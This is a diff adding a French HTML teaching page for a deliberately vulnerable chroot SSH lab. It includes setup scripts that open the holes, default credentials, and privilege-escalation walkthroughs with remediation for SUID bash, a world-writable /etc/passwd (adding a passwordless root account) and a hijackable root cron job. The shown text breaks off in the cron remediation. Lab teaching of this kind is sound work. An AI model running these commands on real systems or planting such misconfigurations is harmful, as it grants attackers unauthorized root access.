@@ -1,0 +1,1224 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Lab Jail Vulnérable — Guide Pédagogique</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Outfit:wght@300;400;600;700;800&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg-primary: #0a0e17;
+    --bg-secondary: #111827;
+    --bg-card: #151d2e;
+    --bg-code: #0d1117;
+    --accent-cyan: #22d3ee;
+    --accent-red: #f43f5e;
+    --accent-green: #34d399;
+    --accent-amber: #fbbf24;
+    --accent-purple: #a78bfa;
+    --accent-blue: #60a5fa;
+    --text-primary: #e2e8f0;
+    --text-secondary: #94a3b8;
+    --text-muted: #64748b;
+    --border: #1e293b;
+    --glow-cyan: 0 0 30px rgba(34,211,238,0.15);
+    --glow-red: 0 0 30px rgba(244,63,94,0.15);
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    font-family: 'Outfit', sans-serif;
+    background: var(--bg-primary);
+    color: var(--text-primary);
+    line-height: 1.7;
+    overflow-x: hidden;
+  }
+
+  /* ─── GRAIN OVERLAY ─── */
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noise'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noise)' opacity='0.03'/%3E%3C/svg%3E");
+    pointer-events: none;
+    z-index: 9999;
+  }
+
+  /* ─── HERO ─── */
+  .hero {
+    position: relative;
+    min-height: 70vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    text-align: center;
+    padding: 4rem 2rem;
+    overflow: hidden;
+  }
+
+  .hero::before {
+    content: '';
+    position: absolute;
+    width: 600px; height: 600px;
+    background: radial-gradient(circle, rgba(34,211,238,0.08) 0%, transparent 70%);
+    top: -200px; left: 50%; transform: translateX(-50%);
+    pointer-events: none;
+  }
+
+  .hero-grid {
+    position: absolute; inset: 0;
+    background-image:
+      linear-gradient(rgba(34,211,238,0.04) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(34,211,238,0.04) 1px, transparent 1px);
+    background-size: 60px 60px;
+    mask-image: radial-gradient(ellipse 60% 60% at 50% 40%, black, transparent);
+    animation: gridPulse 8s ease-in-out infinite;
+  }
+
+  @keyframes gridPulse {
+    0%, 100% { opacity: 0.4; }
+    50% { opacity: 1; }
+  }
+
+  .badge {
+    display: inline-flex; align-items: center; gap: 0.5rem;
+    background: rgba(34,211,238,0.1);
+    border: 1px solid rgba(34,211,238,0.25);
+    color: var(--accent-cyan);
+    padding: 0.4rem 1rem;
+    border-radius: 100px;
+    font-size: 0.8rem;
+    font-weight: 600;
+    letter-spacing: 0.08em;
+    text-transform: uppercase;
+    margin-bottom: 2rem;
+    animation: fadeUp 0.6s ease-out;
+  }
+
+  .badge::before {
+    content: '';
+    width: 8px; height: 8px;
+    background: var(--accent-cyan);
+    border-radius: 50%;
+    animation: blink 2s ease-in-out infinite;
+  }
+
+  @keyframes blink {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0.3; }
+  }
+
+  .hero h1 {
+    font-size: clamp(2.5rem, 6vw, 4.5rem);
+    font-weight: 800;
+    line-height: 1.1;
+    letter-spacing: -0.03em;
+    animation: fadeUp 0.8s ease-out 0.1s both;
+  }
+
+  .hero h1 .glow {
+    background: linear-gradient(135deg, var(--accent-cyan), var(--accent-purple));
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+  }
+
+  .hero-sub {
+    max-width: 600px;
+    color: var(--text-secondary);
+    font-size: 1.15rem;
+    margin-top: 1.5rem;
+    animation: fadeUp 0.8s ease-out 0.2s both;
+  }
+
+  @keyframes fadeUp {
+    from { opacity: 0; transform: translateY(20px); }
+    to   { opacity: 1; transform: translateY(0); }
+  }
+
+  .hero-warning {
+    margin-top: 2.5rem;
+    padding: 1rem 1.5rem;
+    background: rgba(244,63,94,0.08);
+    border: 1px solid rgba(244,63,94,0.25);
+    border-radius: 12px;
+    color: var(--accent-red);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.82rem;
+    max-width: 560px;
+    animation: fadeUp 0.8s ease-out 0.35s both;
+  }
+
+  /* ─── CONTAINER ─── */
+  .container {
+    max-width: 1100px;
+    margin: 0 auto;
+    padding: 0 2rem 6rem;
+  }
+
+  /* ─── SECTION TITLES ─── */
+  .section-header {
+    display: flex;
+    align-items: center;
+    gap: 1rem;
+    margin: 5rem 0 2rem;
+    animation: fadeUp 0.6s ease-out;
+  }
+
+  .section-num {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.75rem;
+    font-weight: 700;
+    color: var(--accent-cyan);
+    background: rgba(34,211,238,0.1);
+    border: 1px solid rgba(34,211,238,0.2);
+    padding: 0.3rem 0.7rem;
+    border-radius: 6px;
+    flex-shrink: 0;
+  }
+
+  .section-header h2 {
+    font-size: 1.8rem;
+    font-weight: 700;
+    letter-spacing: -0.02em;
+  }
+
+  .section-desc {
+    color: var(--text-secondary);
+    font-size: 1rem;
+    margin-bottom: 2rem;
+    max-width: 750px;
+  }
+
+  /* ─── PREREQUIS CARDS ─── */
+  .prereq-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+    gap: 1rem;
+  }
+
+  .prereq-card {
+    background: var(--bg-card);
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    padding: 1.5rem;
+    transition: all 0.3s ease;
+    position: relative;
+    overflow: hidden;
+  }
+
+  .prereq-card:hover {
+    border-color: rgba(34,211,238,0.3);
+    transform: translateY(-2px);
+    box-shadow: var(--glow-cyan);
+  }
+
+  .prereq-card .step-num {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 2rem;
+    font-weight: 700;
+    color: rgba(34,211,238,0.15);
+    position: absolute;
+    top: 0.8rem; right: 1rem;
+  }
+
+  .prereq-card h3 {
+    font-size: 1rem;
+    font-weight: 600;
+    margin-bottom: 0.5rem;
+  }
+
+  .prereq-card p {
+    color: var(--text-secondary);
+    font-size: 0.88rem;
+  }
+
+  .prereq-card code {
+    display: block;
+    margin-top: 0.75rem;
+    background: var(--bg-code);
+    padding: 0.5rem 0.75rem;
+    border-radius: 6px;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.78rem;
+    color: var(--accent-green);
+    border: 1px solid var(--border);
+  }
+
+  /* ─── TAB SYSTEM ─── */
+  .tabs-wrapper {
+    background: var(--bg-secondary);
+    border: 1px solid var(--border);
+    border-radius: 16px;
+    overflow: hidden;
+  }
+
+  .tabs-nav {
+    display: flex;
+    overflow-x: auto;
+    border-bottom: 1px solid var(--border);
+    background: var(--bg-card);
+    scrollbar-width: none;
+  }
+
+  .tabs-nav::-webkit-scrollbar { display: none; }
+
+  .tab-btn {
+    flex-shrink: 0;
+    padding: 1rem 1.5rem;
+    background: transparent;
+    border: none;
+    color: var(--text-muted);
+    font-family: 'Outfit', sans-serif;
+    font-size: 0.88rem;
+    font-weight: 600;
+    cursor: pointer;
+    position: relative;
+    transition: color 0.3s ease;
+    display: flex; align-items: center; gap: 0.5rem;
+    white-space: nowrap;
+  }
+
+  .tab-btn:hover { color: var(--text-primary); }
+
+  .tab-btn.active {
+    color: var(--accent-cyan);
+  }
+
+  .tab-btn.active::after {
+    content: '';
+    position: absolute;
+    bottom: 0; left: 0; right: 0;
+    height: 2px;
+    background: var(--accent-cyan);
+  }
+
+  .tab-icon {
+    font-size: 1.1rem;
+  }
+
+  .tab-panel {
+    display: none;
+    padding: 2rem;
+    animation: fadeIn 0.4s ease;
+  }
+
+  .tab-panel.active { display: block; }
+
+  @keyframes fadeIn {
+    from { opacity: 0; }
+    to   { opacity: 1; }
+  }
+
+  /* ─── VULN CARDS INSIDE TABS ─── */
+  .vuln-meta {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 0.75rem;
+    margin-bottom: 1.5rem;
+  }
+
+  .vuln-tag {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.72rem;
+    font-weight: 600;
+    padding: 0.3rem 0.65rem;
+    border-radius: 6px;
+    letter-spacing: 0.04em;
+    text-transform: uppercase;
+  }
+
+  .tag-difficulty-easy  { background: rgba(52,211,153,0.12); color: var(--accent-green); border: 1px solid rgba(52,211,153,0.25); }
+  .tag-difficulty-med   { background: rgba(251,191,36,0.12); color: var(--accent-amber); border: 1px solid rgba(251,191,36,0.25); }
+  .tag-difficulty-hard  { background: rgba(244,63,94,0.12); color: var(--accent-red); border: 1px solid rgba(244,63,94,0.25); }
+  .tag-mitre            { background: rgba(167,139,250,0.12); color: var(--accent-purple); border: 1px solid rgba(167,139,250,0.25); }
+
+  .vuln-section h3 {
+    font-size: 1.15rem;
+    font-weight: 700;
+    margin-bottom: 0.5rem;
+    display: flex; align-items: center; gap: 0.5rem;
+  }
+
+  .vuln-section h3 .icon { font-size: 1.2rem; }
+
+  .vuln-section p {
+    color: var(--text-secondary);
+    font-size: 0.92rem;
+    margin-bottom: 1rem;
+  }
+
+  .info-box {
+    background: rgba(96,165,250,0.06);
+    border: 1px solid rgba(96,165,250,0.2);
+    border-radius: 10px;
+    padding: 1rem 1.25rem;
+    margin-bottom: 1.5rem;
+    font-size: 0.88rem;
+    color: var(--accent-blue);
+  }
+
+  .info-box strong { color: var(--text-primary); }
+
+  .warning-box {
+    background: rgba(251,191,36,0.06);
+    border: 1px solid rgba(251,191,36,0.2);
+    border-radius: 10px;
+    padding: 1rem 1.25rem;
+    margin-bottom: 1.5rem;
+    font-size: 0.88rem;
+    color: var(--accent-amber);
+  }
+
+  .danger-box {
+    background: rgba(244,63,94,0.06);
+    border: 1px solid rgba(244,63,94,0.2);
+    border-radius: 10px;
+    padding: 1rem 1.25rem;
+    margin: 1.5rem 0;
+    font-size: 0.88rem;
+    color: var(--accent-red);
+  }
+
+  /* ─── CODE BLOCKS ─── */
+  .code-block {
+    position: relative;
+    background: var(--bg-code);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    margin: 1rem 0 1.5rem;
+    overflow: hidden;
+  }
+
+  .code-header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 0.6rem 1rem;
+    background: rgba(255,255,255,0.02);
+    border-bottom: 1px solid var(--border);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.72rem;
+    color: var(--text-muted);
+    text-transform: uppercase;
+    letter-spacing: 0.06em;
+  }
+
+  .copy-btn {
+    background: rgba(255,255,255,0.05);
+    border: 1px solid var(--border);
+    color: var(--text-muted);
+    padding: 0.25rem 0.6rem;
+    border-radius: 5px;
+    cursor: pointer;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.68rem;
+    transition: all 0.2s ease;
+  }
+
+  .copy-btn:hover {
+    background: rgba(34,211,238,0.1);
+    color: var(--accent-cyan);
+    border-color: rgba(34,211,238,0.3);
+  }
+
+  .code-block pre {
+    padding: 1.25rem;
+    overflow-x: auto;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.82rem;
+    line-height: 1.8;
+    color: var(--text-primary);
+  }
+
+  .code-block pre .comment {
+    color: var(--text-muted);
+    font-style: italic;
+  }
+
+  .code-block pre .cmd {
+    color: var(--accent-green);
+  }
+
+  .code-block pre .flag {
+    color: var(--accent-amber);
+  }
+
+  .code-block pre .path {
+    color: var(--accent-cyan);
+  }
+
+  .code-block pre .danger {
+    color: var(--accent-red);
+  }
+
+  .code-block pre .string {
+    color: var(--accent-purple);
+  }
+
+  /* ─── STEP FLOW ─── */
+  .step-flow {
+    display: flex;
+    flex-direction: column;
+    gap: 1rem;
+    margin: 1.5rem 0;
+  }
+
+  .step-item {
+    display: flex;
+    gap: 1rem;
+    align-items: flex-start;
+  }
+
+  .step-marker {
+    flex-shrink: 0;
+    width: 32px; height: 32px;
+    border-radius: 50%;
+    background: rgba(34,211,238,0.1);
+    border: 1px solid rgba(34,211,238,0.3);
+    display: flex; align-items: center; justify-content: center;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.75rem;
+    font-weight: 700;
+    color: var(--accent-cyan);
+  }
+
+  .step-content h4 {
+    font-size: 0.95rem;
+    font-weight: 600;
+    margin-bottom: 0.3rem;
+  }
+
+  .step-content p {
+    font-size: 0.88rem;
+    color: var(--text-secondary);
+  }
+
+  /* ─── REMEDIATION ─── */
+  .remed-box {
+    background: rgba(52,211,153,0.06);
+    border: 1px solid rgba(52,211,153,0.2);
+    border-radius: 10px;
+    padding: 1.25rem 1.5rem;
+    margin: 1.5rem 0;
+  }
+
+  .remed-box h4 {
+    color: var(--accent-green);
+    font-size: 0.95rem;
+    margin-bottom: 0.75rem;
+    display: flex; align-items: center; gap: 0.5rem;
+  }
+
+  .remed-box ul {
+    list-style: none;
+    padding: 0;
+  }
+
+  .remed-box li {
+    color: var(--text-secondary);
+    font-size: 0.88rem;
+    padding: 0.3rem 0;
+    padding-left: 1.2rem;
+    position: relative;
+  }
+
+  .remed-box li::before {
+    content: '✓';
+    position: absolute;
+    left: 0;
+    color: var(--accent-green);
+    font-weight: 700;
+  }
+
+  /* ─── CLEANUP SECTION ─── */
+  .cleanup-section {
+    margin-top: 4rem;
+    padding: 2rem;
+    background: var(--bg-card);
+    border: 1px solid var(--border);
+    border-radius: 16px;
+  }
+
+  .cleanup-section h2 {
+    font-size: 1.5rem;
+    margin-bottom: 0.5rem;
+  }
+
+  /* ─── FOOTER ─── */
+  footer {
+    text-align: center;
+    padding: 3rem 2rem;
+    color: var(--text-muted);
+    font-size: 0.82rem;
+    border-top: 1px solid var(--border);
+  }
+
+  footer a {
+    color: var(--accent-cyan);
+    text-decoration: none;
+  }
+
+  /* ─── RESPONSIVE ─── */
+  @media (max-width: 768px) {
+    .hero { min-height: 55vh; padding: 3rem 1.5rem; }
+    .container { padding: 0 1rem 4rem; }
+    .tab-btn { padding: 0.8rem 1rem; font-size: 0.8rem; }
+    .tab-panel { padding: 1.25rem; }
+    .prereq-grid { grid-template-columns: 1fr; }
+  }
+</style>
+</head>
+<body>
+
+<!-- ═══════════════ HERO ═══════════════ -->
+<section class="hero">
+  <div class="hero-grid"></div>
+  <span class="badge">Lab Cybersécurité — Environnement isolé</span>
+  <h1>Chroot Jail <span class="glow">Vulnérable</span></h1>
+  <p class="hero-sub">
+    Guide pédagogique interactif pour comprendre, exploiter et remédier les failles d'élévation de privilèges dans un environnement chrooté SSH.
+  </p>
+  <div class="hero-warning">
+    ⚠️ DISCLAIMER — Usage strictement réservé à un <strong>lab isolé / CTF interne</strong>. 
+    Consentement écrit obligatoire. Aucune machine de production.
+    Réf. : Art. 323-1 du Code pénal — ANSSI Guide Hygiène v3.
+  </div>
+</section>
+
+<!-- ═══════════════ MAIN CONTENT ═══════════════ -->
+<div class="container">
+
+  <!-- ─── 01. PRÉREQUIS ─── -->
+  <div class="section-header">
+    <span class="section-num">01</span>
+    <h2>Prérequis & Installation</h2>
+  </div>
+  <p class="section-desc">
+    Avant de démarrer le lab, assure-toi d'avoir une VM Debian propre (réseau isolé). Voici les étapes de préparation.
+  </p>
+
+  <div class="prereq-grid">
+    <div class="prereq-card">
+      <span class="step-num">01</span>
+      <h3>VM Debian</h3>
+      <p>Installer une Debian (12+) avec l'option « Serveur SSH » cochée.</p>
+    </div>
+    <div class="prereq-card">
+      <span class="step-num">02</span>
+      <h3>Passer Root & MAJ</h3>
+      <p>Se connecter en root et mettre à jour les paquets.</p>
+      <code>su - && apt update</code>
+    </div>
+    <div class="prereq-card">
+      <span class="step-num">03</span>
+      <h3>Installer Git & dos2unix</h3>
+      <p>Outils nécessaires pour récupérer et préparer les scripts.</p>
+      <code>apt install git dos2unix</code>
+    </div>
+    <div class="prereq-card">
+      <span class="step-num">04</span>
+      <h3>Cloner le dépôt</h3>
+      <p>Récupérer le projet Jail dans /opt/.</p>
+      <code>cd /opt && git clone https://github.com/Slurptheworld/Jail.git</code>
+    </div>
+    <div class="prereq-card">
+      <span class="step-num">05</span>
+      <h3>Préparer les scripts</h3>
+      <p>Convertir les fins de ligne et donner les droits.</p>
+      <code>dos2unix *.sh && chmod +x *.sh</code>
+    </div>
+    <div class="prereq-card">
+      <span class="step-num">06</span>
+      <h3>Lancer l'installation</h3>
+      <p>Exécuter le script principal qui crée la jail.</p>
+      <code>./setup_jail.sh</code>
+    </div>
+  </div>
+
+  <div class="info-box" style="margin-top: 1.5rem;">
+    <strong>Identifiants par défaut :</strong> utilisateur <code>user</code> / mot de passe <code>password123</code>.
+    Connexion : <code>ssh jailed@&lt;IP_VM&gt;</code>
+  </div>
+
+  <!-- ─── 02. ARCHITECTURE ─── -->
+  <div class="section-header">
+    <span class="section-num">02</span>
+    <h2>Architecture de la Jail</h2>
+  </div>
+  <p class="section-desc">
+    Le script <code>setup_jail.sh</code> crée un chroot dans <code>/home/jailed</code> avec un jeu limité de binaires et bibliothèques. L'utilisateur <code>user</code> est enfermé dans un shell restreint <code>rbash</code>.
+  </p>
+
+  <div class="code-block">
+    <div class="code-header">
+      <span>structure du chroot</span>
+    </div>
+    <pre>
+<span class="path">/home/jailed/</span>             <span class="comment"># Racine du chroot</span>
+├── <span class="path">bin/</span>                    <span class="comment"># Binaires autorisés (bash, ls, cat, python3, vim…)</span>
+├── <span class="path">lib/</span> & <span class="path">lib64/</span>          <span class="comment"># Bibliothèques dynamiques copiées</span>
+├── <span class="path">etc/</span>                    <span class="comment"># Fichiers de config (passwd, cron.d…)</span>
+│   ├── passwd              <span class="comment"># Cible : vuln_passwd.sh</span>
+│   └── <span class="path">cron.d/</span>            <span class="comment"># Cible : vuln_cron.sh</span>
+├── <span class="path">tmp/</span>                    <span class="comment"># Zone d'écriture pour les exploits</span>
+└── <span class="path">usr/</span>                    <span class="comment"># Compléments binaires/lib</span></pre>
+  </div>
+
+  <!-- ─── 03. VULNÉRABILITÉS ─── -->
+  <div class="section-header">
+    <span class="section-num">03</span>
+    <h2>Vulnérabilités & Exploitation</h2>
+  </div>
+  <p class="section-desc">
+    Chaque onglet détaille une faille d'élévation de privilèges : contexte théorique, script de mise en place, commandes d'exploitation, et remédiation.
+  </p>
+
+  <div class="tabs-wrapper">
+    <nav class="tabs-nav">
+      <button class="tab-btn active" data-tab="suid">
+        <span class="tab-icon">🔓</span> SUID Bash
+      </button>
+      <button class="tab-btn" data-tab="passwd">
+        <span class="tab-icon">📝</span> /etc/passwd
+      </button>
+      <button class="tab-btn" data-tab="cron">
+        <span class="tab-icon">⏱️</span> Cron Job
+      </button>
+      <button class="tab-btn" data-tab="ldpreload">
+        <span class="tab-icon">💉</span> LD_PRELOAD
+      </button>
+      <button class="tab-btn" data-tab="vim">
+        <span class="tab-icon">⌨️</span> Sudo Vim
+      </button>
+    </nav>
+
+    <!-- ═══ TAB: SUID ═══ -->
+    <div class="tab-panel active" id="tab-suid">
+      <div class="vuln-meta">
+        <span class="vuln-tag tag-difficulty-easy">Difficulté : Facile</span>
+        <span class="vuln-tag tag-mitre">MITRE ATT&CK T1548.001</span>
+      </div>
+
+      <div class="vuln-section">
+        <h3><span class="icon">📖</span> Théorie — Le bit SUID</h3>
+        <p>
+          Quand un binaire possède le bit <strong>SUID</strong> (Set User ID), il s'exécute avec les droits de son <em>propriétaire</em> (ici root), et non ceux de l'utilisateur qui le lance. Si <code>/bin/bash</code> est SUID root, n'importe quel utilisateur peut ouvrir un shell root avec l'option <code>-p</code> (preserve privileges).
+        </p>
+
+        <div class="info-box">
+          <strong>Commande de détection :</strong> <code>find / -perm -4000 -type f 2>/dev/null</code> — Liste tous les binaires SUID sur le système. C'est la première commande à lancer lors d'un pentest local.
+        </div>
+      </div>
+
+      <div class="vuln-section">
+        <h3><span class="icon">🛠️</span> Mise en place (vuln_suid.sh)</h3>
+        <div class="code-block">
+          <div class="code-header"><span>bash — vuln_suid.sh</span><button class="copy-btn" onclick="copyCode(this)">Copier</button></div>
+          <pre><span class="comment">#!/bin/bash</span>
+<span class="comment"># Active le bit SUID sur bash et python3 dans le chroot</span>
+
+<span class="cmd">chmod</span> <span class="flag">4755</span> <span class="path">/home/jailed/bin/bash</span>      <span class="comment"># 4 = SUID, 755 = rwxr-xr-x</span>
+<span class="cmd">chmod</span> <span class="flag">4755</span> <span class="path">/home/jailed/bin/python3</span>   <span class="comment"># Même traitement pour python3</span></pre>
+        </div>
+      </div>
+
+      <div class="vuln-section">
+        <h3><span class="icon">💀</span> Exploitation</h3>
+        <div class="step-flow">
+          <div class="step-item">
+            <div class="step-marker">1</div>
+            <div class="step-content">
+              <h4>Détecter le binaire SUID</h4>
+              <p>Lancer la commande <code>find</code> pour repérer les fichiers SUID.</p>
+            </div>
+          </div>
+          <div class="step-item">
+            <div class="step-marker">2</div>
+            <div class="step-content">
+              <h4>Ouvrir un shell root</h4>
+              <p>Exécuter <code>/bin/bash -p</code> — le flag <code>-p</code> empêche bash de dropper les privilèges.</p>
+            </div>
+          </div>
+        </div>
+
+        <div class="code-block">
+          <div class="code-header"><span>exploitation</span><button class="copy-btn" onclick="copyCode(this)">Copier</button></div>
+          <pre><span class="comment"># Étape 1 : Trouver les binaires SUID</span>
+<span class="cmd">find</span> / <span class="flag">-perm -4000</span> -type f 2>/dev/null
+<span class="comment"># Résultat attendu → /bin/bash</span>
+
+<span class="comment"># Étape 2 : Spawn d'un shell root</span>
+<span class="path">/bin/bash</span> <span class="flag">-p</span>
+<span class="comment"># whoami → root ✅</span></pre>
+        </div>
+      </div>
+
+      <div class="remed-box">
+        <h4>🛡️ Remédiation</h4>
+        <ul>
+          <li>Ne jamais appliquer le bit SUID sur des shells interactifs (bash, sh, zsh)</li>
+          <li>Auditer régulièrement : <code>find / -perm -4000 -type f</code></li>
+          <li>Utiliser <code>capabilities</code> Linux au lieu de SUID quand possible</li>
+          <li>Outil : <code>lynis audit system</code> pour détecter les SUID anormaux</li>
+        </ul>
+      </div>
+    </div>
+
+    <!-- ═══ TAB: PASSWD ═══ -->
+    <div class="tab-panel" id="tab-passwd">
+      <div class="vuln-meta">
+        <span class="vuln-tag tag-difficulty-easy">Difficulté : Facile</span>
+        <span class="vuln-tag tag-mitre">MITRE ATT&CK T1098.001</span>
+      </div>
+
+      <div class="vuln-section">
+        <h3><span class="icon">📖</span> Théorie — /etc/passwd writable</h3>
+        <p>
+          Le fichier <code>/etc/passwd</code> contient la liste des comptes du système. Si un utilisateur non privilégié peut y écrire, il peut ajouter un compte avec <strong>UID 0</strong> (root) et un mot de passe vide, puis basculer dessus avec <code>su</code>.
+        </p>
+        <div class="warning-box">
+          ⚠️ Sur un vrai système, <code>/etc/passwd</code> doit être en <strong>644</strong> (lecture seule sauf root). Les permissions <code>666</code> sont un signal d'alerte immédiat.
+        </div>
+      </div>
+
+      <div class="vuln-section">
+        <h3><span class="icon">🛠️</span> Mise en place (vuln_passwd.sh)</h3>
+        <div class="code-block">
+          <div class="code-header"><span>bash — vuln_passwd.sh</span><button class="copy-btn" onclick="copyCode(this)">Copier</button></div>
+          <pre><span class="comment">#!/bin/bash</span>
+<span class="comment"># Rend /etc/passwd modifiable par tous</span>
+
+<span class="cmd">touch</span> <span class="path">/home/jailed/etc/passwd</span>          <span class="comment"># Crée le fichier s'il n'existe pas</span>
+<span class="cmd">chmod</span> <span class="flag">666</span> <span class="path">/home/jailed/etc/passwd</span>    <span class="comment"># rw-rw-rw- → tout le monde peut écrire</span></pre>
+        </div>
+      </div>
+
+      <div class="vuln-section">
+        <h3><span class="icon">💀</span> Exploitation</h3>
+        <div class="step-flow">
+          <div class="step-item">
+            <div class="step-marker">1</div>
+            <div class="step-content">
+              <h4>Vérifier les permissions</h4>
+              <p><code>ls -la /etc/passwd</code> — doit montrer <code>-rw-rw-rw-</code></p>
+            </div>
+          </div>
+          <div class="step-item">
+            <div class="step-marker">2</div>
+            <div class="step-content">
+              <h4>Injecter un compte root</h4>
+              <p>Ajouter une ligne avec UID/GID 0 et aucun mot de passe.</p>
+            </div>
+          </div>
+          <div class="step-item">
+            <div class="step-marker">3</div>
+            <div class="step-content">
+              <h4>Basculer sur le compte</h4>
+              <p><code>su hacker</code> → shell root sans mot de passe.</p>
+            </div>
+          </div>
+        </div>
+
+        <div class="code-block">
+          <div class="code-header"><span>exploitation</span><button class="copy-btn" onclick="copyCode(this)">Copier</button></div>
+          <pre><span class="comment"># Étape 1 : Vérifier les permissions</span>
+<span class="cmd">ls</span> <span class="flag">-la</span> <span class="path">/etc/passwd</span>
+
+<span class="comment"># Étape 2 : Ajouter un compte root sans mot de passe</span>
+<span class="cmd">echo</span> <span class="string">'hacker::0:0:hacker:/root:/bin/bash'</span> >> <span class="path">/etc/passwd</span>
+<span class="comment">#       ^^  (champ vide = pas de mot de passe)</span>
+<span class="comment">#          UID=0  GID=0 → droits root</span>
+
+<span class="comment"># Étape 3 : Basculer</span>
+<span class="cmd">su</span> hacker
+<span class="comment"># whoami → root ✅</span></pre>
+        </div>
+      </div>
+
+      <div class="remed-box">
+        <h4>🛡️ Remédiation</h4>
+        <ul>
+          <li>Permissions correctes : <code>chmod 644 /etc/passwd</code> (root seul peut écrire)</li>
+          <li>Vérifier : <code>stat -c '%a' /etc/passwd</code> doit retourner <strong>644</strong></li>
+          <li>Configurer un outil de surveillance d'intégrité (AIDE, OSSEC)</li>
+          <li>Interdire les comptes sans mot de passe dans la politique de sécurité</li>
+        </ul>
+      </div>
+    </div>
+
+    <!-- ═══ TAB: CRON ═══ -->
+    <div class="tab-panel" id="tab-cron">
+      <div class="vuln-meta">
+        <span class="vuln-tag tag-difficulty-med">Difficulté : Moyenne</span>
+        <span class="vuln-tag tag-mitre">MITRE ATT&CK T1053.003</span>
+      </div>
+
+      <div class="vuln-section">
+        <h3><span class="icon">📖</span> Théorie — Cron Job détournable</h3>
+        <p>
+          <strong>Cron</strong> exécute des scripts à intervalles réguliers avec les droits spécifiés (souvent root). Si un attaquant peut modifier le script exécuté par un cron root, il peut y injecter du code arbitraire qui s'exécutera avec les <em>plus hauts privilèges</em>.
+        </p>
+        <div class="info-box">
+          <strong>Commande de détection :</strong> <code>cat /etc/crontab</code>, <code>ls -la /etc/cron.d/</code>, <code>crontab -l</code> — Toujours vérifier les tâches planifiées et les permissions des scripts appelés.
+        </div>
+      </div>
+
+      <div class="vuln-section">
+        <h3><span class="icon">🛠️</span> Mise en place (vuln_cron.sh)</h3>
+        <div class="code-block">
+          <div class="code-header"><span>bash — vuln_cron.sh</span><button class="copy-btn" onclick="copyCode(this)">Copier</button></div>
+          <pre><span class="comment">#!/bin/bash</span>
+<span class="comment"># Crée une tâche cron root qui exécute un script modifiable</span>
+
+<span class="cmd">mkdir</span> <span class="flag">-p</span> <span class="path">/home/jailed/etc/cron.d/</span>
+
+<span class="comment"># Cron : toutes les minutes, root exécute malicious.sh</span>
+<span class="cmd">echo</span> <span class="string">"* * * * * root /home/jailed/tmp/malicious.sh"</span> \
+  > <span class="path">/home/jailed/etc/cron.d/vuln_cron</span>
+
+<span class="comment"># Permissions 777 = modifiable par tout le monde !</span>
+<span class="cmd">chmod</span> <span class="flag">777</span> <span class="path">/home/jailed/etc/cron.d/vuln_cron</span></pre>
+        </div>
+      </div>
+
+      <div class="vuln-section">
+        <h3><span class="icon">💀</span> Exploitation</h3>
+        <div class="step-flow">
+          <div class="step-item">
+            <div class="step-marker">1</div>
+            <div class="step-content">
+              <h4>Identifier la tâche cron</h4>
+              <p>Lire <code>/etc/cron.d/vuln_cron</code> pour voir quel script est exécuté en root.</p>
+            </div>
+          </div>
+          <div class="step-item">
+            <div class="step-marker">2</div>
+            <div class="step-content">
+              <h4>Écrire le payload</h4>
+              <p>Remplacer <code>malicious.sh</code> par un script qui copie bash en SUID root.</p>
+            </div>
+          </div>
+          <div class="step-item">
+            <div class="step-marker">3</div>
+            <div class="step-content">
+              <h4>Attendre 1 minute</h4>
+              <p>Le cron s'exécute et crée <code>/tmp/rootbash</code> avec SUID root.</p>
+            </div>
+          </div>
+          <div class="step-item">
+            <div class="step-marker">4</div>
+            <div class="step-content">
+              <h4>Obtenir le shell root</h4>
+              <p>Exécuter <code>/tmp/rootbash -p</code>.</p>
+            </div>
+          </div>
+        </div>
+
+        <div class="code-block">
+          <div class="code-header"><span>exploitation</span><button class="copy-btn" onclick="copyCode(this)">Copier</button></div>
+          <pre><span class="comment"># Étape 1 : Lire la tâche cron</span>
+<span class="cmd">cat</span> <span class="path">/etc/cron.d/vuln_cron</span>
+
+<span class="comment"># Étape 2 : Écrire le payload dans malicious.sh</span>
+<span class="cmd">echo</span> <span class="string">'#!/bin/bash'</span> > <span class="path">/home/jailed/tmp/malicious.sh</span>
+<span class="cmd">echo</span> <span class="string">'cp /bin/bash /home/jailed/tmp/rootbash && chmod 4755 /home/jailed/tmp/rootbash'</span> \
+  >> <span class="path">/home/jailed/tmp/malicious.sh</span>
+<span class="cmd">chmod</span> <span class="flag">+x</span> <span class="path">/home/jailed/tmp/malicious.sh</span>
+
+<span class="comment"># Étape 3 : Attendre ~60 secondes...</span>
+
+<span class="comment"># Étape 4 : Spawn du shell root</span>
+<span class="path">/home/jailed/tmp/rootbash</span> <span class="flag">-p</span>
+<span class="comment"># whoami → root ✅</span></pre>
+        </div>
+      </div>
+
+      <div class="remed-box">
+        <h4>🛡️ Remédiation</h4>
+        <ul>
+          <li>Les fichiers cron doivent appartenir à root et être en <strong>600</strong> ou <strong>644</strong></li>
